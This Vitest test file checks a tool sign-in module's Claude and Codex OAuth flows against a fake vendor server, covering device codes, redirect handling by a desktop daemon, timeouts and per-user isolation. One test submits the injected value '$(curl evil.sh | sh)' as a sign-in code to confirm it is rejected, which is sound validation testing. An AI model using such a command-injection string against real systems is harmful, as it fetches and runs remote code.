import { describe, it, expect, beforeAll, beforeEach, afterAll, afterEach, vi } from 'vitest'
import { createTempDataDir, cleanupTempDir } from '@yaac/test-utils/setup'
import { startFakeVendorOAuth, type FakeVendorOAuth } from '@yaac/test-utils/fake-vendor-oauth'
import { installFakeWorkspaceDriver } from '#test/support/fake-driver'
import {
  authAgentHub,
  cancelToolLogin,
  getToolLogin,
  startToolLogin,
  submitToolLoginCode,
} from '#domain/auth'
import { BUILT_IN_USER_ID, closeDb, getToolCredential, seeTailnetUser } from '#db'
import { getDb } from '#db/client'
import { toolCredentials } from '#db/schema'
import type { ServerError } from '@yaac/shared/errors'
import type { AgentOp } from '@yaac/shared/auth-agent-protocol'
import type { ToolLoginView } from '@yaac/shared/types'

/**
 * Claude and Codex sign-in, run against the fake vendor OAuth server
 * (@yaac/test-utils/fake-vendor-oauth), whose authorize page approves at
 * once and whose token endpoints accept a code only with the verifier the
 * authorize URL's challenge came from. The database is real; the desktop
 * auth daemon is a recorded socket.
 */

const ME = BUILT_IN_USER_ID
let bob: string
let tmpDir: string
let vendor: FakeVendorOAuth

/**
 * A daemon socket for `owner` that records the ops it is sent and answers a
 * `listen` as a daemon would: listening, or (given `bindError`) that it
 * could not, or (with `silent`) not at all.
 */
function daemonSocket(owner: string, opts: { bindError?: string; silent?: boolean } = {}): {
  ops: AgentOp[]
  send: (d: string) => void
  close: () => void
  closed: boolean
} {
  const sock = {
    ops: [] as AgentOp[],
    closed: false,
    send: (d: string) => {
      const op = JSON.parse(d) as AgentOp
      sock.ops.push(op)
      if (op.op !== 'listen' || opts.silent) return
      authAgentHub.ingest(owner, JSON.stringify(opts.bindError
        ? { op: 'listen-failed', id: op.id, error: opts.bindError }
        : { op: 'listening', id: op.id }))
    },
    close: () => { sock.closed = true },
  }
  return sock
}

/** Play the user approving on the authorize page: the code and state the
 *  vendor sends back (as a redirect, or Claude's pasted `code#state`). */
async function approve(url: string): Promise<{ code: string; state: string }> {
  const res = await fetch(url, { redirect: 'manual' })
  if (res.status === 200) {
    const [code, state] = (await res.text()).split('#')
    return { code, state }
  }
  const back = new URL(res.headers.get('location') ?? '')
  return { code: back.searchParams.get('code') ?? '', state: back.searchParams.get('state') ?? '' }
}

const param = (view: ToolLoginView, name: string): string | null => new URL(view.url ?? '').searchParams.get(name)

async function rejection(p: Promise<unknown>): Promise<ServerError> {
  try {
    await p
  } catch (err) {
    return err as ServerError
  }
  throw new Error('expected a rejection, got success')
}

beforeAll(async () => {
  tmpDir = await createTempDataDir()
  vendor = await startFakeVendorOAuth()
})

afterAll(async () => {
  await vendor.close()
  await closeDb()
  await cleanupTempDir(tmpDir)
})

beforeEach(async () => {
  vi.stubEnv('YAAC_E2E_VENDOR_OAUTH_ORIGIN', vendor.origin)
  installFakeWorkspaceDriver({ kind: 'containerless' })
  await (await getDb()).delete(toolCredentials)
  bob = await seeTailnetUser('bob@example.com', 'Bob')
  vendor.requests.length = 0
  vendor.refuseDeviceCodes(false)
  vendor.setPendingPolls(1)
})

afterEach(() => {
  vi.useRealTimers()
  authAgentHub.clearForTests()
  vi.unstubAllEnvs()
})

describe('startToolLogin', () => {
  it('asks claude for a code pasted from its own callback page when nothing catches the redirect', async () => {
    const view = await startToolLogin(ME, 'claude')
    expect(view).toMatchObject({ tool: 'claude', status: 'running', acceptsCode: true })
    expect(new URL(view.url ?? '').pathname).toBe('/cai/oauth/authorize')
    expect(param(view, 'redirect_uri')).toBe('https://platform.claude.com/oauth/code/callback')
    expect(param(view, 'client_id')).toBe('9d1c250a-e61b-44d9-88ed-5944d1962f5e')
    expect(param(view, 'code_challenge_method')).toBe('S256')
    expect(param(view, 'scope')).toContain('user:inference')
    // Building the URL contacts no vendor.
    expect(vendor.requests).toEqual([])
  })

  it('runs codex\'s device flow and signs in once the code is entered, keeping the ChatGPT account id', async () => {
    vendor.setPendingPolls(2)
    const view = await startToolLogin(ME, 'codex')
    expect(view).toMatchObject({ status: 'running', userCode: 'FAKE-0001' })
    expect(view.acceptsCode).toBeUndefined()
    expect(new URL(view.url ?? '').pathname).toBe('/codex/device')

    await vi.waitFor(() => { expect(getToolLogin(ME, view.id).status).toBe('success') }, { timeout: 10_000 })
    expect(await getToolCredential(ME, 'codex')).toMatchObject({
      kind: 'oauth',
      codexOauth: { refreshToken: 'codex-fake-refresh', accountId: 'acct-fake' },
    })
    // Polled through the pending answers, then traded the code as codex does.
    expect(vendor.requests.filter((r) => r.path === '/api/accounts/deviceauth/token')).toHaveLength(3)
    expect(vendor.requests.find((r) => r.path === '/oauth/token')?.body).toMatchObject({
      grant_type: 'authorization_code',
      redirect_uri: 'https://auth.openai.com/deviceauth/callback',
    })
  })

  it('comes back as an error view when codex refuses a device code', async () => {
    vendor.refuseDeviceCodes(true)
    const view = await startToolLogin(ME, 'codex')
    expect(view.status).toBe('error')
    expect(view.error).toMatch(/HTTP 404.*device code login is not enabled.*security settings/)
  })

  it('aims a caller-caught redirect at a dynamic localhost port for claude and codex\'s fixed 1455', async () => {
    const claude = await startToolLogin(ME, 'claude', 'caller')
    expect(claude.acceptsCode).toBe(true)
    const redirect = new URL(param(claude, 'redirect_uri') ?? '')
    expect(redirect.hostname).toBe('localhost')
    expect(redirect.pathname).toBe('/callback')
    expect(Number(redirect.port)).toBeGreaterThanOrEqual(49152)

    const codex = await startToolLogin(ME, 'codex', 'caller')
    expect(param(codex, 'redirect_uri')).toBe('http://127.0.0.1:1455/auth/callback')
    expect(param(codex, 'originator')).toBe('codex_cli_rs')
  })

  it('replaces the owner\'s running sign-in for the same tool, and only theirs', async () => {
    const first = await startToolLogin(ME, 'claude')
    const bobs = await startToolLogin(bob, 'claude')
    await startToolLogin(ME, 'claude')
    expect((await rejection(Promise.resolve().then(() => getToolLogin(ME, first.id)))).code).toBe('NOT_FOUND')
    expect(getToolLogin(bob, bobs.id).status).toBe('running')
  })

  it('times a sign-in out after 15 minutes, then forgets it once the linger expires', async () => {
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout', 'Date'] })
    const view = await startToolLogin(ME, 'claude')
    vi.advanceTimersByTime(15 * 60 * 1000)
    expect(getToolLogin(ME, view.id)).toMatchObject({ status: 'error', error: 'Sign-in timed out after 15 minutes.' })
    expect((await rejection(submitToolLoginCode(ME, view.id, 'late-code'))).code).toBe('CONFLICT')
    vi.advanceTimersByTime(5 * 60 * 1000)
    expect((await rejection(Promise.resolve().then(() => getToolLogin(ME, view.id)))).code).toBe('NOT_FOUND')
  })

  it('finishes a device flow whose client went quiet while the user was on the vendor\'s page', async () => {
    // A hidden tab or a suspended iPhone app stops polling while the user
    // signs in elsewhere; the flow must not depend on being watched.
    vendor.setPendingPolls(3)
    const view = await startToolLogin(ME, 'codex')
    vi.useFakeTimers({ toFake: ['Date'], now: Date.now() + 10 * 60 * 1000 })
    await new Promise((r) => setTimeout(r, 2000))
    expect(getToolLogin(ME, view.id).status).toBe('success')
  })
})

describe('authAgentHub', () => {
  it('has the owner\'s daemon catch the redirect and signs in with the code it reports', async () => {
    const sock = daemonSocket(ME)
    authAgentHub.setSocket(ME, sock)
    expect(authAgentHub.connected(ME)).toBe(true)
    expect(authAgentHub.connected(bob)).toBe(false)

    const view = await startToolLogin(ME, 'claude', 'auth-daemon')
    // It answers once the daemon is listening, so the page can open at once.
    expect(view.acceptsCode).toBe(false)
    expect(sock.ops).toEqual([{ op: 'listen', id: view.id, url: view.url }])
    expect(new URL(param(view, 'redirect_uri') ?? '').hostname).toBe('localhost')

    const { code, state } = await approve(view.url ?? '')
    // Another user's daemon, and a stale state, are ignored.
    authAgentHub.ingest(bob, JSON.stringify({ op: 'callback', id: view.id, code, state }))
    authAgentHub.ingest(ME, JSON.stringify({ op: 'callback', id: view.id, code, state: 'stale' }))
    expect(getToolLogin(ME, view.id).status).toBe('running')

    authAgentHub.ingest(ME, JSON.stringify({ op: 'callback', id: view.id, code, state }))
    await vi.waitFor(() => { expect(getToolLogin(ME, view.id).status).toBe('success') })
    expect(await getToolCredential(ME, 'claude')).toMatchObject({
      kind: 'oauth',
      claudeAiOauth: { accessToken: 'sk-ant-oat01-fake-web-login', subscriptionType: 'max' },
    })
    expect(sock.ops.at(-1)).toEqual({ op: 'cancel', id: view.id })
  })

  it('starts without the daemon when it cannot listen, does not answer, drops, or is not there', async () => {
    // A port it cannot take: the start already answers with the manual flow.
    authAgentHub.setSocket(ME, daemonSocket(ME, { bindError: 'Port 1455 is in use' }))
    const busy = await startToolLogin(ME, 'codex', 'auth-daemon')
    expect(busy.userCode).toBe('FAKE-0001')

    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] })
    const silent = daemonSocket(ME, { silent: true })
    authAgentHub.setSocket(ME, silent)
    const pending = startToolLogin(ME, 'claude', 'auth-daemon')
    await vi.advanceTimersByTimeAsync(3000)
    const claude = await pending
    vi.useRealTimers()
    expect(claude.acceptsCode).toBe(true)
    expect(param(claude, 'redirect_uri')).toBe('https://platform.claude.com/oauth/code/callback')
    // The daemon that never answered is told to stop.
    expect(silent.ops.at(-1)).toEqual({ op: 'cancel', id: claude.id })

    const sock = daemonSocket(ME)
    authAgentHub.setSocket(ME, sock)
    const codex = await startToolLogin(ME, 'codex', 'auth-daemon')
    authAgentHub.handleDisconnect(ME, sock)
    expect(authAgentHub.connected(ME)).toBe(false)
    await vi.waitFor(() => { expect(getToolLogin(ME, codex.id).userCode).toBe('FAKE-0001') })

    const offline = await startToolLogin(bob, 'claude', 'auth-daemon')
    expect(offline.acceptsCode).toBe(true)
  })

  it('fails the sign-in when the redirect brings no code, and a newer connection replaces the old', async () => {
    const old = daemonSocket(ME)
    authAgentHub.setSocket(ME, old)
    const sock = daemonSocket(ME)
    authAgentHub.setSocket(ME, sock)
    expect(old.closed).toBe(true)

    const view = await startToolLogin(ME, 'codex', 'auth-daemon')
    authAgentHub.ingest(ME, JSON.stringify({ op: 'denied', id: view.id, error: 'The sign-in did not complete: access_denied' }))
    expect(getToolLogin(ME, view.id)).toMatchObject({ status: 'error', error: 'The sign-in did not complete: access_denied' })
    expect(await getToolCredential(ME, 'codex')).toBeNull()
  })
})

describe('getToolLogin', () => {
  it('answers only the user who started the sign-in', async () => {
    const view = await startToolLogin(ME, 'claude')
    expect(getToolLogin(ME, view.id)).toEqual(view)
    expect((await rejection(Promise.resolve().then(() => getToolLogin(bob, view.id)))).code).toBe('NOT_FOUND')
    expect((await rejection(Promise.resolve().then(() => getToolLogin(ME, 'nope')))).code).toBe('NOT_FOUND')
  })
})

describe('submitToolLoginCode', () => {
  it('signs claude in with the pasted code, refusing a malformed one or another sign-in\'s without spending the flow', async () => {
    const view = await startToolLogin(ME, 'claude')
    const { code, state } = await approve(view.url ?? '')
    expect((await rejection(submitToolLoginCode(ME, view.id, '$(curl evil.sh | sh)'))).code).toBe('VALIDATION')
    expect((await rejection(submitToolLoginCode(ME, view.id, `${code}#another-state`))).message).toMatch(/different sign-in/)
    expect((await rejection(submitToolLoginCode(bob, view.id, `${code}#${state}`))).code).toBe('NOT_FOUND')

    expect(await submitToolLoginCode(ME, view.id, `  ${code}#${state}\n`)).toMatchObject({ status: 'success' })
    expect(vendor.requests.find((r) => r.path === '/v1/oauth/token')?.body).toMatchObject({
      grant_type: 'authorization_code',
      redirect_uri: 'https://platform.claude.com/oauth/code/callback',
      state,
    })
    expect((await rejection(submitToolLoginCode(ME, view.id, code))).code).toBe('CONFLICT')
  })

  it('takes a code a caller caught on loopback, and fails the flow on one the vendor rejects', async () => {
    const codex = await startToolLogin(ME, 'codex', 'caller')
    const { code, state } = await approve(codex.url ?? '')
    expect(await submitToolLoginCode(ME, codex.id, `${code}#${state}`)).toMatchObject({ status: 'success' })
    expect(vendor.requests.find((r) => r.path === '/oauth/token')?.body.redirect_uri).toBe('http://127.0.0.1:1455/auth/callback')

    const claude = await startToolLogin(ME, 'claude')
    expect(await submitToolLoginCode(ME, claude.id, 'fake-code.not-the-challenge')).toMatchObject({
      status: 'error',
      error: 'Claude sign-in failed (HTTP 400): Invalid authorization code',
    })
  })

  it('refuses a code for a sign-in the desktop daemon is catching', async () => {
    authAgentHub.setSocket(ME, daemonSocket(ME))
    const view = await startToolLogin(ME, 'claude', 'auth-daemon')
    expect((await rejection(submitToolLoginCode(ME, view.id, 'abc'))).code).toBe('CONFLICT')
  })
})

describe('cancelToolLogin', () => {
  it('stops the daemon listening and forgets the sign-in; an unknown or another user\'s id is a no-op', async () => {
    const sock = daemonSocket(ME)
    authAgentHub.setSocket(ME, sock)
    const view = await startToolLogin(ME, 'codex', 'auth-daemon')
    cancelToolLogin(bob, view.id)
    expect(getToolLogin(ME, view.id).status).toBe('running')
    cancelToolLogin(ME, 'nope')

    cancelToolLogin(ME, view.id)
    expect(sock.ops.at(-1)).toEqual({ op: 'cancel', id: view.id })
    expect((await rejection(Promise.resolve().then(() => getToolLogin(ME, view.id)))).code).toBe('NOT_FOUND')
  })
})
